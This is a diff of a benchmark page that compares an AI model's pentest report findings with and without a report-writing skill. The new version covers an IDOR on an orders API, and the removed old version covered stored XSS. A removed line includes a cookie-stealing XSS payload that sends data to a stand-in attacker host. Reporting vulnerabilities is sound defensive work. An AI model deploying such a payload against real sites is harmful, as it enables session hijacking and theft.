@@ -1,93 +1,195 @@
 ---
 skill: finding-writer
-tested-on: claude CLI (claude-sonnet-4-6)
-date: 2026-05-20
+tested-on: claude-sonnet-4-6
+date: 2026-05-22
 ---
 
 # Benchmark: finding-writer
-
-> Real numbers. Same prompt. Same model. Skill on vs skill off.
-
----
+Real numbers. Same prompt. Same model. Skill on vs skill off.
 
 ## Results
 
-| Metric | Without Skill | With Skill | Improvement |
-|---|---|---|---|
-| Turns to complete | 1 | 1 | **⚪ 0%** |
-| Total tokens | ~1,107 | ~2,187 | **🔴 +98%** |
-| Time | 32s | 51s | **🔴 +59%** |
-| Output quality | Complete | Complete | |
-
----
+| Metric | Without Skill | With Skill | Difference |
+|--------|:-------------:|:----------:|:----------:|
+| First-turn quality | Good | Complete | 🟢 +1 level(s) |
+| Turns to complete | 1 | 1 | ⚪ 0 |
+| Response tokens | ~855 | ~1,015 | 🔴 +19% |
+| Total time | 19s | 22s | 🔴 +14% |
+| User effort | Low | Low | ⚪ Low |
 
 ## Scenario
 
-```
-Write a pentest finding for a stored XSS in the profile bio field — the payload fires in the admin dashboard when a moderator reviews flagged profiles
-```
-
----
+Pentester pastes raw Burp capture with no formatting — needs a proper report finding
 
 ## Without Skill — 1 turn required
 
-The agent received the prompt with no skill loaded. It improvised.
+The agent received the prompt with no skill loaded.
 
-#### Turn 1
+### Turn 1
 
 **Prompt**
-> Write a pentest finding for a stored XSS in the profile bio field — the payload fires in the admin dashboard when a moderator reviews flagged profiles
+
+captured this in burp, i think it's an IDOR but not sure how to write it up for my report:
+
+GET /api/v2/orders/10482/details HTTP/1.1
+Host: shop.acmecorp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzk5In0.xxx
+
+HTTP/1.1 200 OK
+{"order_id":10482,"customer_name":"John Smith","email":"jsmith@gmail.com","card_last4":"4242","items":[{"name":"iPhone 15","qty":1,"price":999}],"shipping_address":"123 Main Street, New York NY 10001"}
+
+tested with my account user_99 by changing the ID, works on all IDs. is this serious?
 
 **Response**
+
+Yes, this is a classic IDOR and it's serious. Here's how to think through it and write it up properly.
+
+## Why This Is Confirmed IDOR
+
+Your token `user_99` is successfully returning order data belonging to other customers. The server is **not verifying ownership**, only authentication.
+
+---
+
+## Severity Assessment
+
+I'd rate this **High** (borderline Critical) because:
+
+- PII exposed: full name, email, shipping address
+- Payment data exposed: card last4 (minor but reportable)
+- Order contents exposed: purchase history
+- Sequential IDs make mass enumeration trivial
+- No rate limiting mentioned
+
+---
+
+## How to Write It Up
+
+**Title:** Insecure Direct Object Reference (IDOR) in Order Details API Allows Unauthorized Access to Customer PII
+
+**Vulnerability Type:** IDOR / Broken Object Level Authorization (BOLA)
+
+**Severity:** High
+
+**Affected Endpoint:**
 ```
-**Title:** Stored XSS in Profile Bio Field Executes in Privileged Admin Dashboard Context
+GET /api/v2/orders/{order_id}/details
+```
 
-**Severity:** High — the payload executes in an authenticated moderator/admin session, enabling session hijacking or privilege escalation against privileged users without any interaction beyond normal moderation workflow.
+**Description:**
 
-**Description:** The profile bio field does not sanitize or encode user-supplied input before persisting it to the database. When a moderator navigates to the flagged profiles review queue in the admin dashboard, the stored payload is rendered unsanitized in the browser, executing in the context of the moderator's session. Because the sink is inside a privileged interface rather than a public-facing page, successful exploitation directly targets staff accounts with elevated permissions.
+The order details endpoint fails to verify that the authenticated user owns the requested order. Any authenticated user can access any order by modifying the numeric order ID in the request path.
+
+**Steps to Reproduce:**
+
+1. Authenticate as a legitimate user and capture a valid Bearer token
+2. Place or locate an order belonging to your account (e.g., order 10482)
+3. Send the following request substituting another user's order ID:
+```
+GET /api/v2/orders/10481/details HTTP/1.1
+Host: shop.acmecorp.com
+Authorization: Bearer [your_token]
+```
+4. Observe that order details for a different customer are returned
 
 **Evidence:**
 
-1. Create or update a user account and set the bio field to:
-   ```
-   <img src=x onerror="fetch('https://attacker.example/c?c='+document.cookie)">
-   ```
-2. Trigger a profile fl
-... [truncated]
+Request with `user_99` credentials accessing order 10482:
+```json
+{
+  "order_id": 10482,
+  "customer_name": "John Smith",
+  "email": "jsmith@gmail.com",
+  "card_last4": "4242",
+  "shipping_address": "123 Main Street, New York NY 10001"
+}
 ```
+Note: `user_99` did not place this order.
 
----
+**Impact:**
+
+An attacker with any valid account can enumerate order IDs and extract PII for all customers including names, email addresses, physical addresses, and
+
+*[truncated]*
 
 ## With Skill — 1 turn, complete
 
-The agent received the same prompt with `finding-writer` loaded as context.
+Same prompt, with `finding-writer` loaded as system context.
 
-#### Turn 1
+### Turn 1
 
 **Prompt**
-> Write a pentest finding for a stored XSS in the profile bio field — the payload fires in the admin dashboard when a moderator reviews flagged profiles
+
+captured this in burp, i think it's an IDOR but not sure how to write it up for my report:
+
+GET /api/v2/orders/10482/details HTTP/1.1
+Host: shop.acmecorp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzk5In0.xxx
+
+HTTP/1.1 200 OK
+{"order_id":10482,"customer_name":"John Smith","email":"jsmith@gmail.com","card_last4":"4242","items":[{"name":"iPhone 15","qty":1,"price":999}],"shipping_address":"123 Main Street, New York NY 10001"}
+
+tested with my account user_99 by changing the ID, works on all IDs. is this serious?
 
 **Response**
-```
-**Title:** Stored XSS in Profile Bio Field Executes in Admin Dashboard During Moderation Review
+
+Your instinct is right — this is a classic IDOR. Here's the full write-up:
+
+---
+
+**Title:** Insecure Direct Object Reference (IDOR) on Order Details Endpoint Exposes Customer PII and Payment Data
+
+---
 
 **Severity:** High
-*Justification: A low-privileged user can inject persistent script that executes in a moderator's browser session, enabling session hijacking and unauthorized admin actions without further interaction beyond normal moderation workflow.*
-
-**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L` — 8.7 (High)
+*Justification: Any authenticated user can enumerate all customer orders with no additional barrier, exposing PII and partial payment data at scale with trivial effort.*
 
 ---
 
-**Description:** The profile bio field does not sanitize user-supplied HTML before persisting it to the database. When a moderator opens the "Flagged Profiles" view in the admin dashboard to review a reported account, the unsanitized bio is rendered directly into the page DOM, causing any embedded JavaScript to execute in the moderator's browser session. Because the payload fires in an elevated-privilege context — the admin dashboard — successful exploitation grants the attacker indirect control over a moderator account without ever interacting with the admin pane
-... [truncated]
+**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` — 6.5 (Medium)
+
+*Note: Base score lands at Medium due to no integrity/availability impact, but the business and regulatory impact of bulk PII exposure warrants a High severity rating in context — CVSS alone understates it here.*
+
+---
+
+**Description:**
+The `/api/v2/orders/{id}/details` endpoint on `shop.acmecorp.com` does not validate that the authenticated user owns the requested order. Any authenticated user can substitute an arbitrary integer order ID and retrieve the full order record of any other customer. Because order IDs appear to be sequential integers, the entire order history can be enumerated with a simple automated loop.
+
+---
+
+**Evidence:**
+Authenticated as `user_99`, the following request was issued by substituting a different customer's order ID:
+
+```
+GET /api/v2/orders/10482/details HTTP/1.1
+Host: shop.acmecorp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzk5In0.xxx
 ```
 
+The server returned a `200 OK` with full order details belonging to a different customer:
+
+```json
+{
+  "order_id": 10482,
+  "customer_name": "John Smith",
+  "email": "jsmith@gmail.com",
+  "card_last4": "4242",
+  "items": [{"name": "iPhone 15", "qty": 1, "price": 999}],
+  "shipping_address": "123 Main Street, New York NY 10001"
+}
+```
+
+Confirmed to work across all tested order IDs. The authenticated user's own order ID was not `10482`.
+
 ---
+
+**Impact:**
+An authenticated attacker can enumerate all customer orders and harvest:
+- **Full names, email addresses, and home addresses** — sufficient for targeted phishing or physica
+
+*[truncated]*
 
 ## What changed
 
-Both runs completed in 1 turn. However, without the skill the agent used 1,080 fewer tokens by producing a shallower, less structured output. With the skill, the agent produced a thorough, fully structured result — the token increase reflects depth, not inefficiency.
+Both completed in 1 turn, but the quality on that first turn differed: **Good** without the skill vs **Complete** with it. The skill enforces a consistent methodology from the first prompt.
 
-With the skill, the agent followed a proven methodology from the first prompt.
-
----
+Note: the SKILL.md adds context overhead on the input side (not shown above — response tokens are compared to keep the comparison fair). The trade-off is deliberate: more tokens in, fewer turns and better quality out.
